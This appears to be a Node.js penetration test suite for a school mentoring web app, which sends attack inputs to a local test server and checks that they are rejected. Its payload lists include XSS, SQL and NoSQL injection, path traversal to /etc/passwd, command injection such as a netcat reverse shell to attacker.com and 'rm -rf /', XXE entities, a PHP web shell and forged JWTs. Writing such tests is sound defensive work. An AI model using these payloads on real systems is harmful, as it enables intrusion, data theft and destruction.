const puppeteer = require('puppeteer');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');

const BASE_URL = process.env.TEST_URL || 'http://localhost:3000';
const API_URL = `${BASE_URL}/api`;

class SecurityPenetrationTests {
  constructor() {
    this.browser = null;
    this.page = null;
    this.authToken = null;
    this.results = {
      passed: 0,
      failed: 0,
      vulnerabilities: []
    };
  }

  async setup() {
    this.browser = await puppeteer.launch({
      headless: 'new',
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    this.page = await this.browser.newPage();
    
    // Login to get auth token
    await this.login();
  }

  async teardown() {
    if (this.browser) {
      await this.browser.close();
    }
  }

  async login() {
    try {
      const response = await axios.post(`${API_URL}/auth/login`, {
        email: 'admin@example.com',
        password: 'Admin123!'
      });
      this.authToken = response.data.token;
      
      // Set cookie in browser
      await this.page.setCookie({
        name: 'auth-token',
        value: this.authToken,
        url: BASE_URL
      });
    } catch (error) {
      console.error('Failed to login:', error.message);
    }
  }

  async runTest(testName, testFn) {
    console.log(`\n🔍 Running: ${testName}`);
    try {
      await testFn();
      this.results.passed++;
      console.log(`✅ PASSED: ${testName}`);
    } catch (error) {
      this.results.failed++;
      this.results.vulnerabilities.push({
        test: testName,
        error: error.message,
        severity: error.severity || 'HIGH'
      });
      console.log(`❌ FAILED: ${testName} - ${error.message}`);
    }
  }

  // XSS Tests
  async testXSSVulnerabilities() {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload=alert("XSS")>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<script>eval(atob("YWxlcnQoJ1hTUycp"))</script>',
      '<img src="x" onerror="eval(atob(\'YWxlcnQoJ1hTUycp\'))">',
      '<style>@import\'javascript:alert("XSS")\';</style>'
    ];

    for (const payload of xssPayloads) {
      await this.runTest(`XSS Prevention - ${payload.substring(0, 30)}...`, async () => {
        // Test in various input fields
        const endpoints = [
          '/api/users',
          '/api/schools',
          '/api/observations',
          '/api/mentoring/sessions',
          '/api/mentoring/resources'
        ];

        for (const endpoint of endpoints) {
          try {
            const response = await axios.post(
              `${API_URL}${endpoint}`,
              {
                name: payload,
                description: payload,
                title: payload,
                content: payload
              },
              {
                headers: {
                  'Cookie': `auth-token=${this.authToken}`,
                  'Content-Type': 'application/json'
                }
              }
            );

            // Check if payload was sanitized in response
            const responseData = JSON.stringify(response.data);
            if (responseData.includes('<script>') || responseData.includes('onerror=')) {
              throw new Error(`XSS payload not sanitized in ${endpoint}`);
            }
          } catch (error) {
            if (error.response?.status !== 400 && error.response?.status !== 403) {
              throw new Error(`Unexpected response for XSS payload in ${endpoint}`);
            }
          }
        }
      });
    }
  }

  // SQL Injection Tests
  async testSQLInjection() {
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users;--",
      "' UNION SELECT * FROM users--",
      "1' AND '1'='1",
      "' OR 1=1--",
      "admin'--",
      "' OR 'a'='a",
      "') OR ('1'='1",
      "'; EXEC xp_cmdshell('dir');--",
      "' WAITFOR DELAY '00:00:05'--"
    ];

    for (const payload of sqlPayloads) {
      await this.runTest(`SQL Injection Prevention - ${payload}`, async () => {
        const endpoints = [
          '/api/users/search',
          '/api/schools/search',
          '/api/observations/filter',
          '/api/mentoring/sessions/search'
        ];

        for (const endpoint of endpoints) {
          try {
            const response = await axios.get(
              `${API_URL}${endpoint}?q=${encodeURIComponent(payload)}`,
              {
                headers: {
                  'Cookie': `auth-token=${this.authToken}`
                }
              }
            );

            // Check if we got a valid response (not an error)
            if (response.status === 200) {
              // Make sure we didn't get all records (injection succeeded)
              if (response.data.length > 100) {
                throw new Error(`Possible SQL injection vulnerability in ${endpoint}`);
              }
            }
          } catch (error) {
            if (error.response?.status === 500) {
              throw new Error(`SQL error exposed in ${endpoint}: ${error.response.data}`);
            }
          }
        }
      });
    }
  }

  // NoSQL Injection Tests
  async testNoSQLInjection() {
    const noSqlPayloads = [
      { $ne: null },
      { $gt: "" },
      { $where: "this.password.length > 0" },
      { $regex: ".*" },
      { password: { $ne: 1 } },
      { $or: [{ admin: true }] },
      { __proto__: { admin: true } }
    ];

    for (const payload of noSqlPayloads) {
      await this.runTest(`NoSQL Injection Prevention - ${JSON.stringify(payload)}`, async () => {
        try {
          const response = await axios.post(
            `${API_URL}/auth/login`,
            {
              email: 'admin@example.com',
              password: payload
            }
          );

          if (response.status === 200) {
            throw new Error('NoSQL injection succeeded - authentication bypassed');
          }
        } catch (error) {
          if (error.response?.status !== 401 && error.response?.status !== 400) {
            throw error;
          }
        }
      });
    }
  }

  // Path Traversal Tests
  async testPathTraversal() {
    const pathPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      'C:\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '/var/www/../../etc/passwd'
    ];

    for (const payload of pathPayloads) {
      await this.runTest(`Path Traversal Prevention - ${payload}`, async () => {
        try {
          const response = await axios.get(
            `${API_URL}/files/${encodeURIComponent(payload)}`,
            {
              headers: {
                'Cookie': `auth-token=${this.authToken}`
              }
            }
          );

          if (response.status === 200) {
            throw new Error('Path traversal succeeded - accessed restricted file');
          }
        } catch (error) {
          if (error.response?.status !== 400 && error.response?.status !== 404) {
            throw new Error(`Unexpected response: ${error.response?.status}`);
          }
        }
      });
    }
  }

  // Command Injection Tests
  async testCommandInjection() {
    const cmdPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '`whoami`',
      '$(curl http://evil.com)',
      '&& rm -rf /',
      '; nc -e /bin/sh attacker.com 4444',
      '\n/bin/sh',
      '| sleep 10'
    ];

    for (const payload of cmdPayloads) {
      await this.runTest(`Command Injection Prevention - ${payload}`, async () => {
        const endpoints = [
          '/api/export',
          '/api/reports/generate',
          '/api/backup'
        ];

        for (const endpoint of endpoints) {
          try {
            const response = await axios.post(
              `${API_URL}${endpoint}`,
              {
                filename: `report${payload}`,
                format: `pdf${payload}`
              },
              {
                headers: {
                  'Cookie': `auth-token=${this.authToken}`,
                  'Content-Type': 'application/json'
                }
              }
            );

            // Check if command was executed (e.g., delayed response)
            if (response.headers['x-response-time'] > 5000) {
              throw new Error(`Possible command injection in ${endpoint}`);
            }
          } catch (error) {
            if (error.response?.status === 500) {
              // Check if error reveals command execution
              const errorMsg = error.response.data.error || '';
              if (errorMsg.includes('command') || errorMsg.includes('exec')) {
                throw new Error(`Command execution error exposed in ${endpoint}`);
              }
            }
          }
        }
      });
    }
  }

  // CSRF Tests
  async testCSRFProtection() {
    await this.runTest('CSRF Protection - Missing Token', async () => {
      try {
        // Try to make a state-changing request without CSRF token
        const response = await axios.post(
          `${API_URL}/users`,
          {
            email: 'csrf@test.com',
            name: 'CSRF Test',
            role: 'ADMIN'
          },
          {
            headers: {
              'Cookie': `auth-token=${this.authToken}`,
              'Origin': 'http://evil.com',
              'Referer': 'http://evil.com'
            }
          }
        );

        if (response.status === 200 || response.status === 201) {
          throw new Error('CSRF protection not enforced - request succeeded without proper origin');
        }
      } catch (error) {
        if (error.response?.status !== 403 && error.response?.status !== 401) {
          throw new Error(`Unexpected response: ${error.response?.status}`);
        }
      }
    });
  }

  // XXE Injection Tests
  async testXXEInjection() {
    const xxePayloads = [
      `<?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
       <data>&xxe;</data>`,
      
      `<?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
       <data>&xxe;</data>`,
      
      `<?xml version="1.0"?>
       <!DOCTYPE data [
       <!ELEMENT data ANY>
       <!ENTITY file SYSTEM "file:///etc/passwd">
       ]>
       <data>&file;</data>`
    ];

    for (const payload of xxePayloads) {
      await this.runTest('XXE Injection Prevention', async () => {
        try {
          const response = await axios.post(
            `${API_URL}/import/xml`,
            payload,
            {
              headers: {
                'Cookie': `auth-token=${this.authToken}`,
                'Content-Type': 'application/xml'
              }
            }
          );

          // Check if external entity was processed
          const responseData = JSON.stringify(response.data);
          if (responseData.includes('root:') || responseData.includes('/etc/passwd')) {
            throw new Error('XXE injection succeeded - external entity processed');
          }
        } catch (error) {
          if (error.response?.status !== 400 && error.response?.status !== 415) {
            throw error;
          }
        }
      });
    }
  }

  // File Upload Security Tests
  async testFileUploadSecurity() {
    // Test malicious file types
    const maliciousFiles = [
      { name: 'shell.php', content: '<?php system($_GET["cmd"]); ?>', type: 'application/x-php' },
      { name: 'virus.exe', content: Buffer.from('MZ'), type: 'application/x-msdownload' },
      { name: 'script.js', content: 'alert("XSS")', type: 'application/javascript' },
      { name: '../../../etc/passwd', content: 'test', type: 'text/plain' },
      { name: 'image.jpg.php', content: '<?php phpinfo(); ?>', type: 'image/jpeg' },
      { name: 'polyglot.jpg', content: Buffer.concat([Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]), Buffer.from('<?php system($_GET["cmd"]); ?>')]), type: 'image/jpeg' }
    ];

    for (const file of maliciousFiles) {
      await this.runTest(`File Upload Security - ${file.name}`, async () => {
        const formData = new FormData();
        formData.append('file', file.content, {
          filename: file.name,
          contentType: file.type
        });

        try {
          const response = await axios.post(
            `${API_URL}/upload`,
            formData,
            {
              headers: {
                ...formData.getHeaders(),
                'Cookie': `auth-token=${this.authToken}`
              }
            }
          );

          // Check if dangerous file was accepted
          if (response.status === 200 && file.name.includes('.php')) {
            throw new Error('Dangerous file type accepted');
          }
        } catch (error) {
          if (error.response?.status !== 400 && error.response?.status !== 415) {
            throw new Error(`Unexpected response: ${error.response?.status}`);
          }
        }
      });
    }

    // Test file size limits
    await this.runTest('File Upload - Size Limit', async () => {
      const largeFile = Buffer.alloc(50 * 1024 * 1024); // 50MB
      const formData = new FormData();
      formData.append('file', largeFile, 'large.jpg');

      try {
        const response = await axios.post(
          `${API_URL}/upload`,
          formData,
          {
            headers: {
              ...formData.getHeaders(),
              'Cookie': `auth-token=${this.authToken}`
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
          }
        );

        if (response.status === 200) {
          throw new Error('Large file upload succeeded - no size limit enforced');
        }
      } catch (error) {
        if (error.response?.status !== 413 && error.response?.status !== 400) {
          throw new Error(`Unexpected response: ${error.response?.status}`);
        }
      }
    });
  }

  // Authentication & Session Tests
  async testAuthenticationSecurity() {
    // Test JWT vulnerabilities
    await this.runTest('JWT Security - Algorithm Confusion', async () => {
      const maliciousTokens = [
        // None algorithm
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6IjEiLCJyb2xlIjoiQURNSU4ifQ.',
        // Weak secret
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEiLCJyb2xlIjoiQURNSU4ifQ.DPvxLSa5t8LqtYmJPbJ0DEVRv-5KWJqK_r0SS-Fhvqo'
      ];

      for (const token of maliciousTokens) {
        try {
          const response = await axios.get(
            `${API_URL}/users/me`,
            {
              headers: {
                'Cookie': `auth-token=${token}`
              }
            }
          );

          if (response.status === 200) {
            throw new Error('Weak JWT accepted - authentication bypassed');
          }
        } catch (error) {
          if (error.response?.status !== 401) {
            throw new Error(`Unexpected response: ${error.response?.status}`);
          }
        }
      }
    });

    // Test session fixation
    await this.runTest('Session Fixation Prevention', async () => {
      const fixedSessionId = 'fixed-session-12345';
      
      try {
        // Try to set a predetermined session
        await axios.post(
          `${API_URL}/auth/login`,
          {
            email: 'admin@example.com',
            password: 'Admin123!',
            sessionId: fixedSessionId
          },
          {
            headers: {
              'Cookie': `sessionId=${fixedSessionId}`
            }
          }
        );

        // Check if session ID was regenerated
        const response = await axios.get(
          `${API_URL}/auth/session`,
          {
            headers: {
              'Cookie': `sessionId=${fixedSessionId}`
            }
          }
        );

        if (response.headers['set-cookie']?.includes(fixedSessionId)) {
          throw new Error('Session fixation possible - session ID not regenerated');
        }
      } catch (error) {
        // Expected behavior
      }
    });

    // Test password policy
    await this.runTest('Weak Password Policy', async () => {
      const weakPasswords = ['123456', 'password', 'admin', '12345678', 'qwerty'];
      
      for (const password of weakPasswords) {
        try {
          const response = await axios.post(
            `${API_URL}/users`,
            {
              email: 'weak@test.com',
              password: password,
              name: 'Weak Password Test',
              role: 'TEACHER'
            },
            {
              headers: {
                'Cookie': `auth-token=${this.authToken}`,
                'Content-Type': 'application/json'
              }
            }
          );

          if (response.status === 200 || response.status === 201) {
            throw new Error(`Weak password accepted: ${password}`);
          }
        } catch (error) {
          if (error.response?.status !== 400) {
            throw new Error(`Unexpected response for weak password: ${error.response?.status}`);
          }
        }
      }
    });
  }

  // Rate Limiting Tests
  async testRateLimiting() {
    await this.runTest('Rate Limiting - Authentication Endpoints', async () => {
      const attempts = 10;
      let blockedAt = null;

      for (let i = 0; i < attempts; i++) {
        try {
          await axios.post(
            `${API_URL}/auth/login`,
            {
              email: 'admin@example.com',
              password: 'wrongpassword'
            }
          );
        } catch (error) {
          if (error.response?.status === 429) {
            blockedAt = i + 1;
            break;
          }
        }
      }

      if (!blockedAt) {
        throw new Error('No rate limiting on authentication endpoint');
      }

      if (blockedAt > 5) {
        throw new Error(`Rate limit too high - blocked after ${blockedAt} attempts`);
      }
    });

    await this.runTest('Rate Limiting - API Endpoints', async () => {
      const requests = 100;
      const startTime = Date.now();
      let blockedCount = 0;

      const promises = Array(requests).fill(null).map(async () => {
        try {
          await axios.get(
            `${API_URL}/users`,
            {
              headers: {
                'Cookie': `auth-token=${this.authToken}`
              }
            }
          );
        } catch (error) {
          if (error.response?.status === 429) {
            blockedCount++;
          }
        }
      });

      await Promise.all(promises);
      const duration = Date.now() - startTime;

      if (blockedCount === 0) {
        throw new Error('No rate limiting on API endpoints');
      }

      console.log(`Rate limiting engaged after ${requests - blockedCount} requests in ${duration}ms`);
    });
  }

  // Security Headers Tests
  async testSecurityHeaders() {
    await this.runTest('Security Headers', async () => {
      const response = await axios.get(BASE_URL, {
        validateStatus: () => true
      });

      const requiredHeaders = {
        'strict-transport-security': 'HSTS not set',
        'x-content-type-options': 'X-Content-Type-Options not set',
        'x-frame-options': 'X-Frame-Options not set',
        'x-xss-protection': 'X-XSS-Protection not set',
        'content-security-policy': 'CSP not set',
        'referrer-policy': 'Referrer-Policy not set'
      };

      const missingHeaders = [];
      for (const [header, message] of Object.entries(requiredHeaders)) {
        if (!response.headers[header]) {
          missingHeaders.push(message);
        }
      }

      if (missingHeaders.length > 0) {
        throw new Error(`Missing security headers: ${missingHeaders.join(', ')}`);
      }

      // Check for dangerous headers
      if (response.headers['x-powered-by']) {
        throw new Error('X-Powered-By header exposes server technology');
      }

      if (response.headers['server']) {
        throw new Error('Server header exposes server version');
      }
    });
  }

  // Information Disclosure Tests
  async testInformationDisclosure() {
    await this.runTest('Error Message Information Disclosure', async () => {
      try {
        await axios.get(
          `${API_URL}/users/invalid-id-format`,
          {
            headers: {
              'Cookie': `auth-token=${this.authToken}`
            }
          }
        );
      } catch (error) {
        const errorMessage = error.response?.data?.error || '';
        const stackTrace = error.response?.data?.stack || '';
        
        if (stackTrace) {
          throw new Error('Stack trace exposed in error response');
        }

        if (errorMessage.includes('MongoDB') || 
            errorMessage.includes('Prisma') || 
            errorMessage.includes('PostgreSQL')) {
          throw new Error('Database technology exposed in error message');
        }

        if (errorMessage.includes('/usr/') || 
            errorMessage.includes('C:\\') || 
            errorMessage.includes('/home/')) {
          throw new Error('File paths exposed in error message');
        }
      }
    });

    await this.runTest('Debug Information Disclosure', async () => {
      const debugEndpoints = [
        '/_debug',
        '/debug',
        '/.git',
        '/.env',
        '/config.json',
        '/package.json',
        '/.DS_Store',
        '/phpinfo.php',
        '/test.php'
      ];

      for (const endpoint of debugEndpoints) {
        try {
          const response = await axios.get(`${BASE_URL}${endpoint}`, {
            validateStatus: () => true
          });

          if (response.status === 200) {
            throw new Error(`Debug endpoint accessible: ${endpoint}`);
          }
        } catch (error) {
          // Expected to fail
        }
      }
    });
  }

  // Business Logic Tests
  async testBusinessLogicVulnerabilities() {
    await this.runTest('Privilege Escalation', async () => {
      // Try to escalate privileges by modifying role
      try {
        const response = await axios.patch(
          `${API_URL}/users/me`,
          {
            role: 'ADMINISTRATOR'
          },
          {
            headers: {
              'Cookie': `auth-token=${this.authToken}`,
              'Content-Type': 'application/json'
            }
          }
        );

        if (response.data.role === 'ADMINISTRATOR') {
          throw new Error('Privilege escalation possible - user can change own role');
        }
      } catch (error) {
        if (error.response?.status !== 403 && error.response?.status !== 400) {
          throw error;
        }
      }
    });

    await this.runTest('IDOR - Insecure Direct Object Reference', async () => {
      // Try to access other users' data
      const userIds = ['1', '2', '3', '999999'];
      
      for (const userId of userIds) {
        try {
          const response = await axios.get(
            `${API_URL}/users/${userId}/private-data`,
            {
              headers: {
                'Cookie': `auth-token=${this.authToken}`
              }
            }
          );

          // Check if we got data for a different user
          if (response.data && response.data.userId !== this.currentUserId) {
            throw new Error(`IDOR vulnerability - accessed data for user ${userId}`);
          }
        } catch (error) {
          if (error.response?.status !== 403 && error.response?.status !== 404) {
            // Unexpected error
          }
        }
      }
    });
  }

  async generateReport() {
    console.log('\n' + '='.repeat(60));
    console.log('SECURITY PENETRATION TEST REPORT');
    console.log('='.repeat(60));
    console.log(`Total Tests: ${this.results.passed + this.results.failed}`);
    console.log(`Passed: ${this.results.passed}`);
    console.log(`Failed: ${this.results.failed}`);
    
    if (this.results.vulnerabilities.length > 0) {
      console.log('\nVULNERABILITIES FOUND:');
      console.log('-'.repeat(60));
      
      const bySeverity = {
        CRITICAL: [],
        HIGH: [],
        MEDIUM: [],
        LOW: []
      };

      this.results.vulnerabilities.forEach(vuln => {
        bySeverity[vuln.severity].push(vuln);
      });

      for (const [severity, vulns] of Object.entries(bySeverity)) {
        if (vulns.length > 0) {
          console.log(`\n${severity} SEVERITY:`);
          vulns.forEach(vuln => {
            console.log(`  - ${vuln.test}: ${vuln.error}`);
          });
        }
      }
    } else {
      console.log('\n✅ No vulnerabilities found!');
    }

    // Save detailed report
    const report = {
      timestamp: new Date().toISOString(),
      summary: {
        total: this.results.passed + this.results.failed,
        passed: this.results.passed,
        failed: this.results.failed,
        vulnerabilityCount: this.results.vulnerabilities.length
      },
      vulnerabilities: this.results.vulnerabilities,
      testEnvironment: {
        url: BASE_URL,
        nodeVersion: process.version
      }
    };

    fs.writeFileSync(
      path.join(__dirname, 'penetration-test-report.json'),
      JSON.stringify(report, null, 2)
    );

    console.log('\nDetailed report saved to: penetration-test-report.json');
  }

  async run() {
    console.log('🔒 Starting Security Penetration Tests...\n');
    
    try {
      await this.setup();

      // Run all test categories
      await this.testXSSVulnerabilities();
      await this.testSQLInjection();
      await this.testNoSQLInjection();
      await this.testPathTraversal();
      await this.testCommandInjection();
      await this.testCSRFProtection();
      await this.testXXEInjection();
      await this.testFileUploadSecurity();
      await this.testAuthenticationSecurity();
      await this.testRateLimiting();
      await this.testSecurityHeaders();
      await this.testInformationDisclosure();
      await this.testBusinessLogicVulnerabilities();

      await this.generateReport();

    } catch (error) {
      console.error('Test suite error:', error);
    } finally {
      await this.teardown();
    }

    // Exit with appropriate code
    process.exit(this.results.failed > 0 ? 1 : 0);
  }
}

// Run tests
const tester = new SecurityPenetrationTests();
tester.run();